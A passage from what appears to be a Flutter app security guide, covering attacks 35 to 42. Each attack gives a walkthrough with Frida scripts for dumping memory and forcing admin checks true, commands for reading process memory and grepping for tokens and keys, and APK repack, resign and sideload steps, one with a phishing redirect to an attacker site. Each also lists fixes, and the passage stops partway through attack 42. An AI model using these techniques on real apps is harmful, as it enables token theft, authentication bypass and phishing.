+| 💣 Impact        | Full app compromise, data wipe, payment bypass                    |
+| 🛠️ Fix          | Disable eval, block unsafe plugins, validate config, detect Frida |
+
+
+-------------------------------------------------------------------------
+
+
+
+
+
+ATTACK 35  – Runtime Memory Token Extraction via Frida & Memory Dump**
+
+> *(This attack extracts sensitive data like JWT tokens, auth headers, or user info **directly from app memory** while it’s running — even if it's never stored on disk.)*
+
+---
+
+### 📌 **Description**
+
+Even if your app never stores access tokens in `SharedPreferences` or files, they **must still exist temporarily in memory (RAM)** while your app runs.
+
+On **rooted devices**, attackers can:
+
+* Hook into the running app
+* Dump memory regions
+* Extract sensitive tokens, user info, or even decrypted payloads
+
+✅ This bypasses all storage-layer security.
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🛠️ Requirements:
+
+* Rooted Android device or emulator
+* [`frida`](https://frida.re/) installed
+* Optional: \[`gdb`, `memfd`, `volatility`, `strings`]
+
+---
+
+### 🧪 Step 1: Launch Target App & Attach with Frida
+
+```bash
+frida -U -n com.example.secureapp
+```
+
+✅ App is now hooked.
+
+---
+
+### 🧪 Step 2: Dump Memory to File
+
+```js
+// Frida script (dump-memory.js)
+var ranges = Process.enumerateRanges('--rw-');
+
+for (var i = 0; i < ranges.length; i++) {
+  var r = ranges[i];
+  var mem = Memory.readByteArray(r.base, r.size);
+  var file = new File("/sdcard/memdump_" + i + ".bin", "wb");
+  file.write(mem);
+  file.flush();
+  file.close();
+}
+```
+
+Run it:
+
+```bash
+frida -U -n com.example.secureapp -l dump-memory.js
+```
+
+✅ Memory dumped to `/sdcard`.
+
+---
+
+### 🧪 Step 3: Analyze Memory
+
+Pull it from device:
+
+```bash
+adb pull /sdcard/memdump_0.bin
+strings memdump_0.bin | grep -i 'Bearer'
+strings memdump_0.bin | grep -E 'eyJ0eXAi|access_token|auth'
+```
+
+Sample result:
+
+```text
+Bearer eyJ0eXAiOiJKV1QiLCJh...
+userEmail=amal@gmail.com
+Authorization: Bearer xxxxxx
+```
+
+✅ Tokens in plain text — even if you never stored them.
+
+---
+
+### 💥 **Why It Works**
+
+* Flutter apps use Dart heap + native memory
+* Sensitive data is passed to/from native plugins (MethodChannels)
+* Memory is not encrypted or zeroed after use
+* RAM is readable on rooted devices
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Keep Sensitive Data in Memory for Minimal Time
+
+```dart
+void useToken(String token) {
+  // Use and immediately overwrite
+  apiCall(token);
+  token = ''; // Clear
+}
+```
+
+✅ Prevent long-lived strings in memory.
+
+---
+
+#### ✅ Fix 2: Use Native Memory Management for Extra Sensitive Data
+
+For example, don’t hold passwords in Dart. Instead:
+
+* Pass data via native code
+* Overwrite buffers immediately after use
+
+---
+
+#### ✅ Fix 3: Frida Detection (Advanced)
+
+In native code (Kotlin/Java):
+
+```kotlin
+fun isFridaRunning(): Boolean {
+    val suspicious = listOf("frida", "gadget", "gum-js-loop");
+    val maps = File("/proc/self/maps").readText()
+    return suspicious.any { maps.contains(it) }
+}
+```
+
+Flutter-side:
+
+```dart
+final isHooked = await MethodChannel('secure_check').invokeMethod('detectFrida');
+```
+
+---
+
+#### ✅ Fix 4: Use Remote Session Tokens
+
+Keep tokens only on backend, not on device:
+
+```dart
+// Instead of JWT on device:
+final sessionID = await backend.createSession();
+```
+
+✅ Backend owns the real token — memory dump gives nothing critical.
+
+---
+
+### 🛡️ Summary
+
+| 🔐 Vulnerability | Sensitive data left in memory can be dumped on rooted devices       |
+| ---------------- | ------------------------------------------------------------------- |
+| 💥 Impact        | Steal JWTs, emails, credentials, decrypted payloads                 |
+| 🛠️ Fix          | Minimize token lifetime in memory, detect Frida, offload to backend |
+
+
+
+-----------------------------------------------------------------------
+
+
+ATTACK 36: FLUTTER RUNTIME MEMORY HOOKING
+
+**(Modify Dart object behavior at runtime using Frida)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps compile Dart into native code (`libapp.so`) and run inside a VM with native bindings. Even though Dart is compiled, **attackers can hook into your app’s memory** at runtime and:
+
+* 🔁 Change return values of sensitive functions
+* 🧠 Bypass condition checks (e.g., `if (user.isAdmin)`)
+* 🕵️‍♂️ Extract secrets like tokens, in-memory objects, or keys
+* ⚙️ Inject custom logic **without modifying the APK**
+
+✅ All of this happens *live* while the app is running using **Frida**.
+
+---
+
+### 🧪 Exploitation Steps — Dart Runtime Hooking with Frida
+
+---
+
+#### 📲 Step 1: Install Frida on Device
+
+```bash
+adb push frida-server /data/local/tmp/
+adb shell "chmod 755 /data/local/tmp/frida-server"
+adb shell "/data/local/tmp/frida-server &"
+```
+
+✅ Root required (or Frida Gadget for non-rooted test).
+
+---
+
+#### 🧬 Step 2: Attach to Running Flutter App
+
+```bash
+frida -U -n com.yourapp.package
+```
+
+---
+
+#### 🧠 Step 3: Enumerate Dart Methods (Inside `libapp.so`)
+
+```bash
+frida> Module.findExportByName("libapp.so", "some_known_method");
+```
+
+Or list all symbols:
+
+```js
+Module.enumerateSymbols("libapp.so").forEach(function(sym) {
+  if (sym.name.includes("isAdmin") || sym.name.includes("check")) {
+    console.log(sym.name);
+  }
+});
+```
+
+---
+
+#### 🐍 Step 4: Intercept & Patch a Method (Force Admin)
+
+```js
+Interceptor.attach(Module.findExportByName("libapp.so", "_MyApp_checkAdmin"), {
+  onLeave: function (retval) {
+    console.log("Original return: " + retval);
+    retval.replace(1); // Always return true = admin access
+  }
+});
+```
+
+✅ Now attacker bypasses all in-app security checks without patching APK.
+
+---
+
+### 💥 Real-World Use Cases
+
+* 🔓 Force premium access without payment
+* 🛑 Disable ban logic (`isBanned()` → false)
+* 💣 Replace values like `userToken`, `subscriptionType`
+* 🧪 Modify authentication results live
+* 🧱 Bypass licensing, biometric checks, or in-app root detection
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+bool isAdmin(String email) => email == 'admin@example.com';
+
+if (isAdmin(currentUser.email)) {
+  showAdminPanel();
+}
+```
+
+✅ Frida can patch `isAdmin` to always return `true` — no matter the logic.
+
+---
+
+### 💥 Why This Works
+
+* Flutter compiles to `libapp.so` → accessible via Frida
+* Dart VM doesn’t prevent runtime hooking
+* No runtime code integrity verification
+* Dart doesn't use pointer hiding or memory obfuscation
+
+---
+
+### 🛡️ Secure Fix 1: Use Code Integrity Verification (Native Layer)
+
+At runtime, verify the checksum of `libapp.so`:
+
+```c
+sha256sum /data/app/com.app.name/lib/arm64/libapp.so
+```
+
+Compare it against your expected signature in the backend — if it doesn’t match, **exit the app or deny backend access**.
+
+---
+
+### 🛡️ Secure Fix 2: Detect Frida at Runtime
+
+Detect known Frida artifacts:
+
+```dart
+Future<bool> detectFrida() async {
+  final result = await Process.run('ps', []);
+  return result.stdout.toString().contains("frida");
+}
+```
+
+Or use native checks:
+
+```c
+if (strstr(proc_list, "frida") != NULL || access("/system/lib/libfrida-gadget.so", F_OK) == 0) {
+  exit(1); // Detected Frida
+}
+```
+
+✅ Exit app if Frida is running.
+
+---
+
+### 🛡️ Secure Fix 3: Move Critical Logic to Backend
+
+Never do this:
+
+```dart
+if (user.hasLicense) enablePremium();
+```
+
+Do this:
+
+```dart
+final isLicensed = await backend.verifyLicense(user.token);
+if (isLicensed) enablePremium();
+```
+
+✅ Backend-controlled logic is immune to runtime patching.
+
+---
+
+### 🛡️ Secure Fix 4: Use Anti-Debug + Memory Protection
+
+Use `seccomp`, `ptrace`, or native root detection logic to block Frida and dynamic analysis.
+
+Or use open-source Frida protection libraries:
+
+* [RootBeer](https://github.com/scottyab/rootbeer)
+* [Frida Detection Library](https://github.com/OWASP/owasp-mstg)
+
+---
+
+### ⚠️ Risk Level: EXTREMELY HIGH
+
+Frida Runtime Hook = total control over your app’s logic in real time.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Frida hooks Dart functions in memory at runtime |
+| ---------------- | ----------------------------------------------- |
+| 💣 Impact        | Admin bypass, logic injection, live token theft |
+| 🛠️ Fix          | Obfuscate, detect Frida, move logic server-side |
+
+
+
+
+------------------------------------------------------------------
+
+
+
+
+ATTACK 37: RUNTIME MEMORY INSPECTION (RAM SNIFFING)
+
+**(Extract tokens, passwords, or secrets directly from process memory)**
+
+---
+
+### 📌 **Description**
+
+Flutter runs on Dart VM (in release mode: AOT compiled). Like any app, it allocates memory dynamically (heap/stack). This means:
+
+✅ If a user logs in, or you decode a token or secret and **store it in memory** (e.g., a `String variable`), it **can be found by attackers** using:
+
+* 🐍 Frida memory scanning
+* 🧠 ADB dumps from rooted devices
+* 🐞 GDB/Lldb or `cat /proc/<pid>/mem`
+* 🔬 Live RAM inspection with tools like `gdb`, `x64dbg`, `frida-trace`, etc.
+
+---
+
+### 🧪 Exploitation Steps – Memory Extraction
+
+---
+
+#### 🧠 Step 1: App Stores Token/Password in Variable
+
+```dart
+final String token = await secureStorage.read(key: 'token');
+```
+
+✅ This variable now exists **in memory** as plaintext.
+
+---
+
+#### 🧪 Step 2: Attacker Finds App Process
+
+```bash
+adb shell ps | grep com.myapp
+```
+
+Gets process ID (e.g., `12345`).
+
+---
+
+#### 💉 Step 3: Read Memory Regions
+
+```bash
+adb shell su -c "cat /proc/12345/maps"    # Memory layout
+adb shell su -c "cat /proc/12345/mem"     # Full memory dump (if rooted)
+```
+
+Or use `frida-trace` to scan memory for strings:
+
+```js
+Memory.scan(ptr('0xADDRESS'), 0x1000, {
+  onMatch: function (address, size) {
+    console.log('Found: ' + Memory.readUtf8String(address));
+  },
+  onComplete: function () {}
+});
+```
+
+✅ Tokens, passwords, card numbers can be found as cleartext.
+
+---
+
+#### 🐍 Step 4: Filter Memory by Keyword
+
+Use `strings` or `grep`:
+
+```bash
+strings memory.dmp | grep "eyJhbGci"   # JWT tokens
+strings memory.dmp | grep "sk_live"   # Stripe keys
+```
+
+✅ Full tokens appear.
+
+---
+
+### 💥 Why This Works
+
+* Dart `String`, `List<int>`, etc. are stored **in memory in plaintext**
+* Memory is not zeroed after use
+* No memory encryption by default
+* No garbage collection guarantee on when variable gets deleted
+* Long-lived `StatefulWidgets` or global providers keep data in memory
+
+---
+
+### 💻 Vulnerable Dart Code (Typical Mistake)
+
+```dart
+String jwt = await secureStorage.read(key: 'jwt'); // now lives in RAM
+```
+
+Or:
+
+```dart
+final password = myController.text; // in memory until widget is destroyed
+```
+
+---
+
+### 🛡️ Secure Fix 1: Minimize Time Secrets Live in RAM
+
+Don’t store sensitive values in long-lived variables.
+
+✅ Read → Use → Nullify:
+
+```dart
+final token = await secureStorage.read(key: 'token');
+// use token
+token = ''; // nullify
+```
+
+✅ Also null controller values:
+
+```dart
+passwordController.clear();
+```
+
+---
+
+### 🛡️ Secure Fix 2: Use `Uint8List` Instead of String
+
+Avoid `String` for secrets. Use `Uint8List` (can be zeroed).
+
+```dart
+Uint8List passwordBytes = utf8.encode(password);
+passwordBytes.fillRange(0, passwordBytes.length, 0); // zero it out
+```
+
+✅ `String` can’t be cleared from memory — but `Uint8List` can.
+
+---
+
+### 🛡️ Secure Fix 3: Avoid Global Variables for Sensitive Data
+
+Never do:
+
+```dart
+String globalToken = '';
+```
+
+✅ Use scoped data, and clear immediately.
+
+---
+
+### 🛡️ Secure Fix 4: Use Native C++ or Rust Plugins for Crypto
+
+Move critical logic (token handling, key derivation) into native code using:
+
+* FFI
+* C++ (NDK)
+* Rust with memory management
+
+✅ Easier to control memory in native than Dart heap.
+
+---
+
+### ⚠️ Risk Level: HIGH (on rooted or compromised devices)
+
+RAM access = real-time session hijack, password theft, crypto drain.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Secrets or tokens stored in RAM                      |
+| ---------------- | ---------------------------------------------------- |
+| 💣 Impact        | Full session hijack, private data theft              |
+| 🛠️ Fix          | Zero memory, use `Uint8List`, avoid `String` storage |
+
+
+
+----------------------------------------------------------------------------
+
+
+
+ATTACK 38: FLUTTER REVERSE ENGINEERING USING JADX & GHIDRA
+
+**(Decompile APK to extract secrets, logic, and plugin behavior)**
+
+---
+
+### 📌 **Description**
+
+Even though Flutter compiles Dart code into native ARM binaries (AOT), your app **still contains native libraries**, Java bootstraps, and sometimes **hardcoded config files**.
+
+Attackers use tools like:
+
+* [`jadx`](https://github.com/skylot/jadx) – to decompile `classes.dex` into readable Java
+* [`Ghidra`](https://ghidra-sre.org/) – to reverse `.so` files (native Flutter/Dart logic)
+* \[`apktool`] – to extract assets, resources, and manifests
+* \[`strings`, `nm`, `readelf`] – to inspect `.so` for function names
+
+✅ These tools give insight into:
+
+* 🔐 API keys
+* 🧬 Business logic
+* 🔍 Root/jailbreak detection functions
+* 🧪 Payment logic
+* 🪪 Firebase project ID, Google Maps keys, etc.
+
+---
+
+### 🧪 Exploitation Steps – Decompiled Code Extraction
+
+---
+
+#### 🛠️ Step 1: Decompile APK Using JADX
+
+```bash
+jadx -d out/ myapp.apk
+cd out/
+```
+
+Search for secrets in:
+
+```
+com/example/myapp/MainActivity.java
+com/example/myapp/BuildConfig.java
+```
+
+✅ Often contains:
+
+```java
+public final class BuildConfig {
+  public static final String API_KEY = "sk_live_ABC123";
+}
+```
+
+---
+
+#### 🐍 Step 2: Search Native Flutter Libraries (`libapp.so`) Using Ghidra
+
+Flutter compiles Dart into a native `.so` (ELF) binary.
+
+Open `lib/arm64-v8a/libapp.so` in Ghidra or IDA Pro.
+
+✅ Look for:
+
+* String constants (e.g., `https://api.example.com`)
+* Method names (`doPaymentValidation`, `validateLicense`)
+* Custom Dart functions embedded in binary form
+
+---
+
+#### 🔍 Step 3: Static Analysis of Assets and Config Files
+
+From APK or `apktool d myapp.apk`, extract and inspect:
+
+* `assets/flutter_assets/` → Dart kernel binaries
+* `assets/config.json`, `info.txt`, `urls.js`
+* `AndroidManifest.xml` → permission abuse, intent filters
+
+---
+
+#### 🎯 Step 4: Extract Hidden Routes or Features
+
+From Dart metadata:
+
+```bash
+strings libapp.so | grep "/admin"
+```
+
+✅ May reveal **hidden pages**, **routes**, or **internal debug UIs**:
+
+```
+/adminDashboard  
+/testMode  
+/api/v1/internal/token?mode=dev
+```
+
+---
+
+### 💥 Why This Works
+
+* Flutter binaries (`libapp.so`) are only lightly obfuscated
+* Dart’s AOT code still leaks string constants
+* Java wrappers expose plugin names, activities, services
+* Many devs leave API keys or config hardcoded
+
+---
+
+### 💻 Examples of Common Leaks
+
+| Leak Type     | Location                          | Found By         |
+| ------------- | --------------------------------- | ---------------- |
+| API Keys      | `BuildConfig.java`, `libapp.so`   | jadx / Ghidra    |
+| Firebase Info | `google-services.json`, logs      | assets/ or XML   |
+| Payment Logic | `libin_app_purchase.so`, Dart FFI | Ghidra / IDA Pro |
+| Feature Flags | `assets/config.json`              | apktool / jadx   |
+
+---
+
+### 🛡️ Secure Fix 1: Don’t Hardcode Secrets
+
+Move to backend or use environment variables at build time:
+
+```dart
+// BAD
+const apiKey = "sk_live_ABC123";
+
+// GOOD
+const apiKey = String.fromEnvironment("API_KEY");
+```
+
+✅ Build secret at compile time, not stored in source.
+
+---
+
+### 🛡️ Secure Fix 2: Use Code Obfuscation
+
+Enable obfuscation in Flutter:
+
+```bash
+flutter build apk --obfuscate --split-debug-info=build/debug-info/
+```
+
+✅ Obfuscates function names and removes readable metadata.
+
+---
+
+### 🛡️ Secure Fix 3: Use ProGuard for Java/Native Wrappers
+
+For Java/Kotlin parts of your Flutter plugins:
+
+```proguard
+-keep class io.flutter.** { *; }
+-dontwarn io.flutter.**
+```
+
+✅ Obfuscates and shrinks native plugin bridge code.
+
+---
+
+### 🛡️ Secure Fix 4: Monitor for API Key Abuse
+
+If your API key is leaked:
+
+* Rotate keys regularly
+* Set IP/domain usage restrictions
+* Monitor logs for abuse
+
+✅ Prevents external parties from abusing keys.
+
+---
+
+### ⚠️ Risk Level: CRITICAL
+
+Reverse engineering = total exposure of internal logic and secrets.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Decompilation of APK via JADX/Ghidra                  |
+| ---------------- | ----------------------------------------------------- |
+| 💣 Impact        | API key theft, secret routes, full logic exposure     |
+| 🛠️ Fix          | Obfuscation, dynamic keys, remove secrets from binary |
+
+
+
+--------------------------------------------------------------------------
+
+
+
+
+ATTACK 39: FLUTTER APP INTEGRITY BYPASS VIA APK REPACK + SIDE-LOADING
+
+**(Modify, resign, and install fake Flutter apps)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps are distributed as `.apk` files. These can be **unpacked, modified, and re-signed** with fake logic — then **side-loaded** into a target device.
+
+This allows attackers to:
+
+* Inject backdoors or keyloggers
+* Remove authentication checks
+* Add custom API endpoints (man-in-the-app)
+* Hook network logic to steal data
+* Bypass app updates from Play Store
+
+This attack is commonly used in **pirated mod apps, malware, or phishing variants** of legit Flutter apps.
+
+---
+
+### 🧪 Exploitation Steps – APK Repack + Install
+
+---
+
+#### 🔨 Step 1: Decompile the APK
+
+```bash
+apktool d app-release.apk -o hacked_app
+```
+
+This gives you access to all:
+
+* Flutter assets
+* AndroidManifest.xml
+* Smali code (`/smali`)
+* Dart-decompiled strings & logic
+
+---
+
+#### 💉 Step 2: Modify the Logic or Resources
+
+Examples:
+
+* Remove login check in smali or manifest
+* Replace API base URL in Flutter assets
+* Modify asset files (e.g., config.json)
+
+✅ Even Dart strings can be replaced in `/assets/flutter_assets/`
+
+---
+
+#### 🔖 Step 3: Rebuild the App
+
+```bash
+apktool b hacked_app -o repacked.apk
+```
+
+---
+
+#### 🔐 Step 4: Sign the Fake APK
+
+```bash
+keytool -genkey -v -keystore hacker.jks -alias hackerkey \
+ -keyalg RSA -keysize 2048 -validity 10000
+
+jarsigner -keystore hacker.jks repacked.apk hackerkey
+```
+
+✅ Now it’s signed with your fake cert (not the original dev’s signature).
+
+---
+
+#### 📲 Step 5: Install the Fake App
+
+```bash
+adb install -r repacked.apk
+```
+
+✅ You now have a **fully modified** Flutter app running on a device, undetected unless the original app implements **integrity checks**.
+
+---
+
+### 💻 Dart Behavior Affected by Repack
+
+```dart
+if (isPremiumUser) {
+  showPremiumFeatures();  // ❌ removed or changed in assets
+}
+```
+
+Or:
+
+```dart
+final api = "https://secure.api.com";  // ➡️ replaced with malicious server
+```
+
+✅ This can be replaced in asset JSON or strings inside the `.apk`.
+
+---
+
+### 💥 Why This Works
+
+* Flutter compiles to native binary and assets
+* App signature is **only verified by the Play Store**
+* If sideloaded via `adb install`, no signature check happens
+* No built-in anti-tampering in standard Flutter apps
+
+---
+
+### 🛡️ Secure Fix 1: Enforce Play Store Signature Check (Play Integrity API)
+
+Use [Play Integrity API](https://developer.android.com/google/play/integrity) to verify:
+
+* App is installed from Google Play
+* App is not modified
+* App is running on genuine device
+
+Dart wrapper plugin:
+
+```yaml
+google_play_integrity: ^1.0.0
+```
+
+Use:
+
+```dart
+final response = await PlayIntegrity.getIntegrityToken();
+if (!verifyServerSide(response.token)) {
+  exit(1); // or show tamper alert
+}
+```
+
+✅ Stops execution on tampered/sideloaded builds.
+
+---
+
+### 🛡️ Secure Fix 2: Signature Check Inside App (Android)
+
+In native Java/Kotlin:
+
+```java
+Signature[] sigs = getPackageManager()
+  .getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES).signatures;
+
+String actual = sigs[0].toCharsString();
+if (!actual.equals(expectedSignature)) {
+   System.exit(0); // tampered
+}
+```
+
+✅ Block app if signature doesn't match production cert.
+
+---
+
+### 🛡️ Secure Fix 3: Use App Hash Check (Flutter)
+
+You can SHA256 the `.apk` or a critical asset:
+
+```dart
+String apkHash = await hashApkBinary();
+if (apkHash != expectedHash) exit(0);
+```
+
+✅ Works even offline — blocks fake builds.
+
+---
+
+### 🛡️ Secure Fix 4: Obfuscate Flutter + Minify Release
+
+```bash
+flutter build apk --release --obfuscate --split-debug-info=./symbols
+```
+
+✅ Obfuscates Dart code & symbols — makes reverse engineering harder.
+
+---
+
+### ⚠️ Risk Level: **CRITICAL**
+
+Repack = total control over your app logic, APIs, security — **no user will know they’re using a fake copy** unless you check.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | APK repack and sideload with modified behavior   |
+| ---------------- | ------------------------------------------------ |
+| 💣 Impact        | Logic bypass, data theft, backdoors, spoofing    |
+| 🛠️ Fix          | Play Integrity API, signature check, hash verify |
+
+
+
+
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+ATTACK 40 – Reverse Engineering `libapp.so` to Extract Hidden Secrets & Admin Routes**
+
+> *(This is one of the **most powerful real-world Flutter pentesting techniques**. It bypasses UI, finds admin panels, feature flags, test modes, and even hardcoded credentials.)*
+
+---
+
+### 📌 **Description**
+
+In Flutter, all your compiled Dart code gets bundled into a native binary called:
+
+```bash
+libapp.so
+```
+
+This `.so` file contains:
+
+* Strings (like API keys, secrets, flags)
+* Class names, method names
+* Route names (`/admin`, `/hidden`, `/premium_test`)
+* Feature toggles
+* Test logic
+
+Reverse engineering this file can reveal **dangerous internal data** even if the app is obfuscated.
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🧩 Step 1: Extract `libapp.so` from APK
+
+```bash
+unzip my_flutter_app.apk -d out/
+cd out/lib/arm64-v8a/
+```
+
+You’ll find:
+
+```bash
+libapp.so
+```
+
+#### 🧠 Step 2: Load into Ghidra or IDA
+
+Use [Ghidra](https://ghidra-sre.org):
+
+```bash
+ghidraRun
+# Import libapp.so
+# Analyze binary
+```
+
+Navigate to:
+
+```
+Strings → Search → "/admin"
+```
+
+✅ Reveals hidden routes like:
+
+* `/admin-dashboard`
+* `/test-billing`
+* `/superuser`
+* `/debug-console`
+* `/env-reset`
+
+Also look for:
+
+* `Authorization: Bearer`
+* `X-Internal-Feature`
+* `token=sk_test_...`
+* `flutter: hidden_feature = true`
+
+#### 🔍 Step 3: Open in Strings Tool (Quick Method)
+
+```bash
+strings libapp.so | grep -i "admin"
+strings libapp.so | grep -i "token"
+strings libapp.so | grep -i "http"
+```
+
+✅ May expose:
+
+```bash
+https://api.app.com/admin/setConfig?key=freePremium
+Bearer hardcoded_api_key_1234
+```
+
+---
+
+### 💥 **Why It Works**
+
+* Flutter Dart code is compiled into native `.so` using `Dart AOT`
+* But strings are **not encrypted**, just embedded in binary
+* Even if obfuscated, Flutter can’t hide:
+
+  * Route names
+  * Raw API URLs
+  * Config flags
+* Ghidra/string tools easily expose them
+
+---
+
+### 🧪 Real Example
+
+```bash
+strings libapp.so | grep -i secret
+
+➡️ "admin_login_enabled"
+➡️ "/debug/access"
+➡️ "sk_live_123456789"
+➡️ "mode=TEST"
+```
+
+Use `/debug/access` as a direct route in the app’s navigator or deep link.
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Don’t Hardcode Secrets
+
+Move tokens, flags, admin URLs to server-side.
+
+#### ✅ Fix 2: Obfuscate Dart Code
+
+Use `flutter build` with `--obfuscate` and `--split-debug-info`:
+
+```bash
+flutter build apk --obfuscate --split-debug-info=build/debug-info
+```
+
+✅ This:
+
+* Obfuscates Dart class and method names
+* Reduces string exposure
+* Makes reverse engineering harder (not impossible)
+
+#### ✅ Fix 3: Add Route Guards
+
+Even if `/admin` is exposed:
+
+```dart
+if (!currentUser.isAdmin) {
+  Navigator.pushReplacement(context, LoginPage());
+}
+```
+
+✅ Don’t allow access just because the route exists.
+
+#### ✅ Fix 4: Strip Debug Logging
+
+Avoid logging test flags or API keys in release builds.
+
+---
+
+### 🛡️ Summary
+
+| 🔐 Vulnerability | Flutter `.so` file leaks hidden logic                |
+| ---------------- | ---------------------------------------------------- |
+| 💥 Impact        | Reveals admin routes, test APIs, secrets             |
+| 🛠️ Fix          | Obfuscate code, don’t hardcode secrets, guard routes |
+
+
+
+--------------------------------------------------------------------------
+
+
+
+ATTACK 41: FLUTTER CODE OBFUSCATION BYPASS
+
+
+**(Decompile and reverse-engineer Dart code from APK)**
+
+---
+
+### 📌 **Description**
+
+Flutter compiles Dart into native **ARM binaries**, but:
+
+* Class/function names are **preserved by default**
+* Reflection-like behavior can expose logic
+* Obfuscation is **not on** by default
+* With tools like `jadx`, `ghidra`, `strings`, and `Frida`, attackers can:
+
+✅ Reconstruct:
+
+* Business logic
+* API keys
+* App flow
+* Hardcoded secrets
+* Custom algorithms (auth tokens, access checkers, validations)
+
+---
+
+### 🧪 Exploitation Steps — Reverse Engineering Flutter APK
+
+---
+
+#### 🔍 Step 1: Decompile APK
+
+```bash
+apktool d app-release.apk -o output/
+```
+
+This extracts:
+
+* `/lib/arm64-v8a/libapp.so` (Dart + Flutter compiled code)
+* `assets/flutter_assets/isolate_snapshot_data`
+* `vm_snapshot_data` (contains compiled symbols)
+
+---
+
+#### 🧠 Step 2: Use `strings` or `ghidra` to Extract Class/Method Names
+
+```bash
+strings lib/arm64-v8a/libapp.so | grep -i 'password\|token\|admin'
+```
+
+✅ Reveals function names like:
+
+```
+_LoginController_checkAdminAccess
+_TokenValidator_generate
+_UserService_resetPassword
+```
+
+---
+
+#### 🔬 Step 3: Use Ghidra to Decompile Native Code
+
+* Load `libapp.so` into Ghidra
+* Analyze disassembled Dart functions
+* Reverse business logic from instruction flow
+* Watch for logic like:
+
+```dart
+if (user.role == 'admin' && user.token.startsWith('secret_')) { ... }
+```
+
+✅ You’ll see control flow clearly and **can replicate** it.
+
+---
+
+#### 🐍 Bonus: Use Frida to Hook Deobfuscated Dart Methods
+
+```js
+Interceptor.attach(Module.findExportByName("libapp.so", "_LoginController_checkAdminAccess"), {
+  onLeave: function (retval) {
+    console.log("[+] Admin check result: " + retval);
+    retval.replace(1); // force allow
+  }
+});
+```
+
+✅ Now attacker bypasses business checks in memory!
+
+---
+
+### 💥 Why This Works
+
+* Dart code is compiled, but function names are preserved
+* Most devs forget to enable obfuscation
+* Even with obfuscation, `.so` files can be disassembled
+* No code integrity validation = easy logic patching
+
+---
+
+### 🛡️ Secure Fix 1: Enable Dart Obfuscation at Build Time
+
+```bash
+flutter build apk --release --obfuscate --split-debug-info=build/debug-info/
+```
+
+✅ This strips symbol names and saves mapping for debugging.
+
+**Example without obfuscation:**
+
+```dart
+class AuthValidator {
+  bool isAdmin(String role) => role == 'admin';
+}
+```
+
+Shows as: `_AuthValidator_isAdmin`
+
+**With obfuscation:**
+
+```bash
+class A {
+  bool a(String a) => a == 'admin';
+}
+```
+
+✅ Makes reverse engineering painful.
+
+---
+
+### 🛡️ Secure Fix 2: Move Business Logic to Backend
+
+Instead of:
+
+```dart
+if (user.role == 'admin') showAdminPanel();
+```
+
+Use:
+
+```dart
+final isAdmin = await backend.checkPrivileges(token);
+if (isAdmin) showAdminPanel();
+```
+
+✅ Can’t be reverse engineered from frontend.
+
+---
+
+### 🛡️ Secure Fix 3: Use Runtime Checksum Validation for `libapp.so`
+
+Add this native code:
+
+```c
+FILE *f = fopen("/data/app/your.app.name/lib/arm64/libapp.so", "rb");
+unsigned char hash[32]; // SHA-256
+calculate_sha256(f, hash);
+
+if (memcmp(hash, expected_hash, 32) != 0) {
+  // App was tampered — exit!
+  exit(1);
+}
+```
+
+✅ Detects modified binaries at runtime.
+
+---
+
+### 🛡️ Secure Fix 4: Use ProGuard for Java/Android Layer Too
+
+For native plugins or Java code, add:
+
+```proguard
+-keep class com.yourcompany.** { *; }
+-dontoptimize
+-dontpreverify
+```
+
+✅ Mixes obfuscation across Dart + Java.
+
+---
+
+### ⚠️ Risk Level: VERY HIGH
+
+Reverse engineering = full app logic exposure, token manipulation, business rule bypass.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | Obfuscation missing → attackers reverse Dart/Native logic |
+| ---------------- | --------------------------------------------------------- |
+| 💣 Impact        | Access control bypass, token forging, app logic clone     |
+| 🛠️ Fix          | Obfuscate code, move logic server-side, validate binaries |
+
+
+
+-------------------------------------------------------------------------
+
+
+🔥 **ATTACK 42 – Asset Repack Attack: Modify Flutter App UI via Asset Injection**
+
+> *(Real-world APK tampering: Inject fake login screens, premium unlocks, altered branding — all without touching Dart source code.)*
+
+---
+
+### 📌 **Description**
+
+Flutter apps bundle UI assets — images, fonts, JSON, sometimes even `.dart` files (for eval engines) — inside the **`assets/` folder**, compiled into the APK.
+
+⚠️ These assets are:
+
+* **Not encrypted**
+* **Easily replaceable**
+* **Trust-based loaded by the app**
+
+An attacker can extract the APK, modify assets (like logos, `.json` files, configs), repackage the app, and inject **fake logic or phishing screens** — while keeping the app functional.
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🔍 Step 1: Unpack the Target APK
+
+```bash
+apktool d target_app.apk -o unpacked
+```
+
+Navigate to:
+
+```
+unpacked/assets/flutter_assets/
+```
+
+✅ You’ll see:
+
+* `AssetManifest.json`
+* `FontManifest.json`
+* App images, configs
+* Possibly JSON for app state or remote settings
+
+#### 🔍 Step 2: Modify Key Files
+
+**Example 1: Inject a fake "Premium Unlocked" flag**
+
+In `config.json`:
+
+```json
+{
+  "isPremium": false
+}
+```
+
+➡️ Change to:
+
+```json
+{
+  "isPremium": true
+}
+```
+
+App will load and show premium UI without actual purchase logic.
+
+---
+
+**Example 2: Replace splash screen / logo**
+
+* Swap `splash.png` or logo assets
+* Inject fake branding or phishing visuals
+
+```bash
+cp my_logo.png unpacked/assets/flutter_assets/images/logo.png
+```
+
+✅ Now your repackaged APK shows a new logo or fake screen.
+
+---
+
+**Example 3: Inject fake login redirect**
+
+If Flutter uses a local HTML asset or config for login:
+
+```json
+"login_redirect": "https://attacker-site.com"
+```
+
+➡️ You’ve turned the app into a **phishing payload**.
+
+---
+
+#### 🔍 Step 3: Repack & Sign APK
+
+```bash
+apktool b unpacked -o fake_app.apk
+```
+
+Sign the APK:
+
+```bash
+keytool -genkey -v -keystore my-release-key.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
+jarsigner -verbose -keystore my-release-key.keystore fake_app.apk mykey
+```
+
+Install:
+
+```bash
+adb install fake_app.apk
+```
